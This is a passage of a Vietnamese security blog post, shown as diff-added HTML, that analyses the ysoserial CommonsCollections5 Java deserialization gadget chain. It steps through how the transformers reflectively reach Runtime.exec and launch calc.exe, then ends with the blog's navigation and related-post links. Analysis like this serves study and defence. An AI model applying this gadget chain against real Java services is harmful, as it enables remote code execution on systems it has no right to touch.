+<li>ConstantTransformer</li>
+<li>InvokerTransformer</li>
+<li>InvokerTransformer</li>
+<li>InvokerTransformer</li>
+<li>ConstantTransformer</li>
+</ul>
+<p>Bây giờ ta sẽ test từng vòng loop để xem nó làm những gì.</p>
+<p><img src="https://hackmd.io/_uploads/S18Akl9kbl.png" alt="image"></p>
+<p>Ở đây với <code>i=0</code> thì nó được gán Object là <code>foo</code> ở đây nó dạng <code>this.iTransformers[0] = ConstantTransformer</code> nó gọi <code>ConstantTransformer(object)</code>.</p>
+<p><img src="https://hackmd.io/_uploads/rkD7bg9Jbe.png" alt="image"></p>
+<p>ConstantTransformer sẽ có dạng như dưới đây :</p>
+<p><img src="https://hackmd.io/_uploads/BkUHbx9y-g.png" alt="image"></p>
+<p>Ở đây ta sẽ thấy rằng giá trị của iConstant đã set giá trị của Object trở thành class <code>lang.java.Runtime</code>.</p>
+<p><img src="https://hackmd.io/_uploads/B1ngzecy-x.png" alt="image"></p>
+<p><img src="https://hackmd.io/_uploads/Hk8MMe5k-e.png" alt="image"></p>
+<p>Tới với vòng lặp thứ 2 là <code>i=1</code> ta có : </p>
+<ul>
+<li><p>this.iTransformer[1].transform(object) &#x3D; InvokerTransformer.transform(object)</p>
+</li>
+<li><p>object &#x3D; class java.lang.Runtime()</p>
+</li>
+<li><p>InvokerTransformer.transform()</p>
+</li>
+</ul>
+<p><img src="https://hackmd.io/_uploads/H1uZ5B91Ze.png" alt="image"></p>
+<p>Ở đây ta có các giá trị bao gồm : </p>
+<ul>
+<li>Class cls : nó là class java.lang.Class.</li>
+</ul>
+<p><img src="https://hackmd.io/_uploads/rkZQsS5Jbe.png" alt="image"></p>
+<ul>
+<li><code>this.iMethodName</code> &#x3D; <code>cls.getMethod</code> nó đã được set ở trước.</li>
+</ul>
+<p><img src="https://hackmd.io/_uploads/Hkts9rqkbl.png" alt="image"></p>
+<ul>
+<li><code>this.iParamTypes = Class[] { String.class, Class[].class }</code> : cũng đã được set giá trị trước.</li>
+</ul>
+<p><img src="https://hackmd.io/_uploads/rJmGor9Jbg.png" alt="image"></p>
+<ul>
+<li><code>Method method</code> &#x3D; Class.getMethod().</li>
+</ul>
+<p><img src="https://hackmd.io/_uploads/Byt9jr51Zg.png" alt="image"></p>
+<ul>
+<li><code>this.Args = new Object[]</code> { “getRuntime”, new Class[0] }.</li>
+</ul>
+<p><img src="https://hackmd.io/_uploads/Bkf2jB5k-l.png" alt="image"></p>
+<p>Cuối cùng là nó thực hiện <code>return method.invoke(input, iArgs)</code> dưới đây là hình minh hoạ dễ hiểu cho method <code>InvokerTransformer</code>.</p>
+<p><img src="https://hackmd.io/_uploads/ByiYar91-l.png" alt="image"></p>
+<ul>
+<li><p>Ở đây ở dòng <code>Class cls = input.getClass();</code> có sự khác biệt khá lớn so với <code>method InvokerTransformer.transform()</code> thông thường vì method này thường sẽ input là một object nhưng ở đây nó lại là 1 class cụ thể là <code>class java.lang.Runtime</code> thật là ảo giác từ đó khi thực hiện <code>getClass</code> nó sẽ giống như gọi <code>Class.getClass()</code> rồi return nó lại <code>class Class</code>. </p>
+</li>
+<li><p>Sau đó đến dòng <code>Method method = cls.getMethod(iMethodName, iParamTypes);</code> thì nó cũng lú tương tự, ở đây nó sẽ dùng <code>Class.getMethod</code> và method này sẽ trả về <code>getMethod</code> của <code>class Class</code>.</p>
+</li>
+<li><p>Và ở cuối sẽ là <code>method invoke</code> ta đã lấy ở bên trên ở đây nó sử dụng <code>Method.invoke(object, args)</code> nó là Reflection API ở đây nó sử dụng <code>Reflection API</code> này là để invoke một method của object khi nó không thể cast theo một kiểu đã được xác định trước. Ta có thể hiểu nôm na rằng ở đây ta có một <code>private class ABCXZY </code> nào đó và một <code>public method foo()</code> nào đó từ nơi khác nhận được <code>object</code> của <code>class ABCXYZ</code>. Thì ở đây thường để <code>invoke</code> được method <code>ABCXYZ.foo()</code> này ta sẽ không thể gọi thẳng đến <code>object.foo()</code> mà ta phải cast nó sang dạng kiểu ((ABCXYZ)object).foo(). Nhưng cái dở hơi ở đây ta lại khai báo nó là <code>private class</code> thì sao mà đưa ra ngoài được thì method Reflection giải quyết cho ta vấn đề trên.</p>
+</li>
+<li><p><code>return method.invoke(input, this.iArgs);</code> cũng không có gì với vòng lặp thứ 2 này kết quả của invoke này là kết quả của đoạn trước tại đây object của nó là <code>class Runtime</code> ta có thể xem <code>input=Runtime.class</code> là 1 <code>object</code> của <code>class Class</code> sau đó kết quả của vòng lặp thứ 3 này nó là <code>method Runtime()</code> bây giờ ta đi đến vòng lặp thứ 4</p>
+</li>
+</ul>
+<p>Tới với vòng lặp thứ 4 tại đây giá trị <code>i = 3</code>.</p>
+<p><img src="https://hackmd.io/_uploads/HyM9r8cJbl.png" alt="image"></p>
+<p><img src="https://hackmd.io/_uploads/HyaqSL5yWl.png" alt="image"></p>
+<p>Tại đây giá trị của <code>iMethodName</code> đã là <code>exec</code> cùng với đó là <code>iArgs</code> nay đã được gán giá trị là <code>calc.exe</code>.</p>
+<p><img src="https://hackmd.io/_uploads/BkrT8I9yWg.png" alt="image"></p>
+<p>Debug đến đây nó sẽ thực thi invoke chạy hàm exec đến calc.exe tại đây máy tính đã được popup lên.</p>
+<p><img src="https://hackmd.io/_uploads/Hk1ZvIc1bx.png" alt="image"></p>
+<p>Vậy là kết thúc phân tích CC5 của Ysoserial.</p>
+<p>Nguồn tham khảo phân tích: <a target="_blank" rel="noopener" href="https://sec.vnpt.vn/2020/02/the-art-of-deserialization-gadget-hunting-part-2">https://sec.vnpt.vn/2020/02/the-art-of-deserialization-gadget-hunting-part-2</a></p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>Author: </span><span class="post-copyright-info"><a href="https://pzhat.github.io">Phat Mai</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>Link: </span><span class="post-copyright-info"><a href="https://pzhat.github.io/2025/11/15/2025-11-07-Ysoserial-CC5/">https://pzhat.github.io/2025/11/15/2025-11-07-Ysoserial-CC5/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>Copyright Notice: </span><span class="post-copyright-info">All articles on this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless otherwise stated.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/Web/">Web</a><a class="post-meta__tags" href="/tags/ysoserial/">ysoserial</a></div><div class="post-share"><div class="social-share" data-image="/img/butterfly-icon.png" data-sites="facebook,x,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/2025/11/15/2025-11-14-CSRF-PortSwigger-Challenge/" title="PortSwigger CSRF Challenge WriteUps"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info"><div class="info-1"><div class="info-item-1">Previous</div><div class="info-item-2">PortSwigger CSRF Challenge WriteUps</div></div><div class="info-2"><div class="info-item-1">PortSwigger CSRF Challenge WriteUpGiới thiệu về CSRF (Cross-Site Request Forgery)Lỗ hổng CSRF là gì : Cross-Site Request Forgery hay còn gọi theo tiếng việt là giả mạo yêu cầu trên nhiều trang, là một lỗ hổng bảo mật cho phép attacker lừa người dùng đã được xác thực (đã đăng nhập) thực hiện các hành động không mong muốn trên 1 ứng dụng Web. Nói đơn giản thì attacker sẽ mượn danh tính và session của một victim để gửi đi một yêu cầu giả mạo đến ứng dụng mà victim không hề hay biết. Nếu ứng dụng...</div></div></div></a><a class="pagination-related" href="/2025/11/15/2025-11-04-THM-Basic-Pentesting/" title="Tryhackme Basic Pentesting Challenge"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-right"><div class="info-1"><div class="info-item-1">Next</div><div class="info-item-2">Tryhackme Basic Pentesting Challenge</div></div><div class="info-2"><div class="info-item-1">Tryhackme Basic Pentesting Challenge Sử dụng nmap để scan các port đang mở của target ở đây tôi sử dụng lệnh nmap -sV -T4 &lt;ip&gt; để scan cho nhanh và ta nhận được kết quả là 4 port đang mở. Với câu hỏi đầu là What is the name of the hidden directory on the web server ta sẽ tiến hành scan directory bằng gobuster ở đâu mình dùng lệnh :  1gobuster dir -u http://10.10.237.96 -w /usr/share/wordlists/dirb/common.txt -t 20 -x php,html,txt   Ta tìm được directory hidden đó là /development và trả ...</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>Related Articles</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/2025/11/15/2025-10-28-Ysoserial-URLDNS/" title="Java Deserialze - URLDNS Chain analysis (ysoserial)"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-11-15</div><div class="info-item-2">Java Deserialze - URLDNS Chain analysis (ysoserial)</div></div><div class="info-2"><div class="info-item-1">Java Deserialze - URLDNS Chain analysis (ysoserial) Java Deserialize là gì? Java cung cấp cho người dùng hàm writeObject() để tiến hành quá trình serialize các object ở đây quá trình serialize sinh ra để chuyển một đối tượng Java thành chuỗi byte để lưu trữ (file, DB) hoặc truyền qua mạng (socket, RMI, JMS). Và để có thể đọc được dữ liệu được serialize từ ObjectInputStream ta có quá trình deserialize ở java sử dụng hàm readObject() cho quá trình đó.  Khai thác Java Object Injection Rủi ro sẽ ...</div></div></div></a><a class="pagination-related" href="/2025/11/15/2025-09-09-CanteenFood-CTF-Challenge-WriteUp/" title="CanteenFood CTF Challenge WriteUp"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-11-15</div><div class="info-item-2">CanteenFood CTF Challenge WriteUp</div></div><div class="info-2"><div class="info-item-1">CanteenFood CTF Challenge WriteUp by @PhatmhTiến hành phân tích chức năng theo kiểu BlackBox Đây là một trang Web có chức năng cho User tìm kiếm được món ăn phù hợp với túi tiền của mình nhất bằng cách nhập số tiền mình mong muốn nó sẽ trả về món mà mình đủ tiền trả.  Ở đây sau khi viết ra số 300 và tiến hành bấm chức năng thì nó trả về được list các món dưới 300.  Ở ngay bên trên mình phát hiện được một nơi đáng ngờ là chữ admin có thể dẫn ta đi đâu đó vì thể click thử vào.  Nó trả về cho ta...</div></div></div></a><a class="pagination-related" href="/2025/11/15/2025-09-09-FileUpload-Servlet/" title="Java Servlet FileUpload Vulnerability"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-11-15</div><div class="info-item-2">Java Servlet FileUpload Vulnerability</div></div><div class="info-2"><div class="info-item-1">Java Servlet FileUpload Vulnerability by @PhatmhLỗ hổng File UploadBản chất của File Upload: File Upload đối với tôi nó đơn giản chỉ là lợidụng Unsafe Method để truyền một Untrusted Data vào nhằm thay đổi hànhvi của hệ thống trong trường hợp này là Web App, với FileUpload những gìUser Upload lên sẽ chính là Untrusted Data và với Feature Upload Filenhư này sẽ thế nào nếu nó không được Validate một cách cẩn thận ta sẽđến với DEMO bằng Java Servlet. Web App OverviewĐây là một Web App được dựng v...</div></div></div></a><a class="pagination-related" href="/2025/11/15/2025-09-09-Servlet-Cmdi/" title="Java Servlet Command Injection Vulnerability Challenges"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-11-15</div><div class="info-item-2">Java Servlet Command Injection Vulnerability Challenges</div></div><div class="info-2"><div class="info-item-1">Java Servlet Command Injection Vulnerability ChallengesCấu trúc Project Cấu trúc Project   1234567891011121314151617181920212223242526272829303132333435+---.idea+---.mvnª   +---wrapper+---srcª   +---mainª   ª   +---javaª   ª   ª   +---ciª   ª   ª       +---controllerª   ª   ª       +---serviceª   ª   ª       +---utilª   ª   +---resourcesª   ª   ª   +---META-INFª   ª   +---webappª   ª       +---WEB-INFª   +---testª       +---javaª       +---resources+---target    +---classes    ª   +---ci    ª...</div></div></div></a><a class="pagination-related" href="/2025/11/15/2025-09-09-Servlet-Sql-Injection/" title="Java Servlet Sql Injection Vulnerability by @Phatmh"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-11-15</div><div class="info-item-2">Java Servlet Sql Injection Vulnerability by @Phatmh</div></div><div class="info-2"><div class="info-item-1">Java Servlet Sql Injection Vulnerability by @PhatmhTổng quan cấu trúc file java123456789101112131415161718192021222324252627282930313233343536373839+---.idea   +---dataSources+---.mvn   +---wrapper+---src   +---main      +---java         +---sql_injection             +---controller             +---dao             +---model             +---util      +---resources         +---META-INF      +---webapp          +---WEB-INF   +---test       +---java       +---resources+---target    +---classes    ...</div></div></div></a><a class="pagination-related" href="/2025/11/15/2025-09-16-WebSec.fr-level28/" title="WebSec.fr Level 28 CTF challenge"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-11-15</div><div class="info-item-2">WebSec.fr Level 28 CTF challenge</div></div><div class="info-2"><div class="info-item-1">WebSec.fr Level 28 CTF challengeTổng quan: 1234567891011121314151617181920212223&lt;?phpif(isset($_POST[&#x27;submit&#x27;])) &#123;  if ($_FILES[&#x27;flag_file&#x27;][&#x27;size&#x27;] &gt; 4096) &#123;    die(&#x27;Your file is too heavy.&#x27;);  &#125;  $filename = &#x27;./tmp/&#x27; . md5($_SERVER[&#x27;REMOTE_ADDR&#x27;]) . &#x27;.php&#x27;;  $fp = fopen($_FILES[&#x27;flag_file&#x27;][&#x27;tmp_name&#x27;], &#x27;r&#x27;);  $flagfilecontent = fread($fp, filesize($_FILES[&#x27;flag_file...</div></div></div></a></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/butterfly-icon.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">Phat Mai</div><div class="author-info-description">A blog about cybersecurity, hacking, pentesting, red teaming and more.</div><div class="site-data"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">27</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">7</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">8</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>Announcement</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Contents</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Ysoserial-Commons-Collections-5-Analyst"><span class="toc-number">1.</span> <span class="toc-text">Ysoserial Commons Collections 5 Analyst</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Tong-quan-CommonsCollections-5-trong-Ysoserial"><span class="toc-number">1.1.</span> <span class="toc-text">Tổng quan CommonsCollections 5 trong Ysoserial</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Thiet-lap-moi-truong"><span class="toc-number">1.2.</span> <span class="toc-text">Thiết lập môi trường</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Payload"><span class="toc-number">1.3.</span> <span class="toc-text">Payload</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Phan-tich-tung-phan-va-Debug"><span class="toc-number">1.4.</span> <span class="toc-text">Phân tích từng phần và Debug</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#BadAttributeValueExpException-readObject-%E2%80%93-TiedMapEntry-toString"><span class="toc-number">1.4.1.</span> <span class="toc-text">BadAttributeValueExpException.readObject() –&gt; TiedMapEntry.toString()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#TiedMapEntry-%E2%80%93-LazyMap-get"><span class="toc-number">1.4.2.</span> <span class="toc-text">TiedMapEntry() –&gt; LazyMap.get()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#LazyMap-get-%E2%80%93-ChainedTransformer-transform"><span class="toc-number">1.4.3.</span> <span class="toc-text">LazyMap.get() –&gt; ChainedTransformer.transform()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ChainedTransformer-transform-%E2%80%93-Phan-con-lai"><span class="toc-number">1.4.4.</span> <span class="toc-text">ChainedTransformer.transform() –&gt; Phần còn lại</span></a></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Posts</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/11/15/2025-11-03-I.redteam-Kerberoasting/" title="Ired.Team Kerberoasting (Credential Access)">Ired.Team Kerberoasting (Credential Access)</a><time datetime="2025-11-14T19:34:38.244Z" title="Created 2025-11-15 02:34:38">2025-11-15</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/11/15/2025-11-07-I.redteam-Kerberos-Golden-Ticket/" title="Ired.Team Kerberos Golden Tickets Lab">Ired.Team Kerberos Golden Tickets Lab</a><time datetime="2025-11-14T19:34:38.244Z" title="Created 2025-11-15 02:34:38">2025-11-15</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/11/15/2025-11-04-THM-Basic-Pentesting/" title="Tryhackme Basic Pentesting Challenge">Tryhackme Basic Pentesting Challenge</a><time datetime="2025-11-14T19:34:38.244Z" title="Created 2025-11-15 02:34:38">2025-11-15</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/11/15/2025-11-07-Ysoserial-CC5/" title="Ysoserial Commons Collections 5 Analyst">Ysoserial Commons Collections 5 Analyst</a><time datetime="2025-11-14T19:34:38.244Z" title="Created 2025-11-15 02:34:38">2025-11-15</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/11/15/2025-11-14-CSRF-PortSwigger-Challenge/" title="PortSwigger CSRF Challenge WriteUps">PortSwigger CSRF Challenge WriteUps</a><time datetime="2025-11-14T19:34:38.244Z" title="Created 2025-11-15 02:34:38">2025-11-15</time></div></div></div></div></div></div></main><footer id="footer"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;&nbsp;2025 By Phat Mai</span><span class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 8.1.1</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.5.2</a></span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Reading Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Toggle Between Light and Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle Between Single-column and Double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="Settings"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back to Top"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=5.5.2"></script><script src="/js/main.js?v=5.5.2"></script><div class="js-pjax"></div><script async data-pjax src="/"></script></div></body></html>
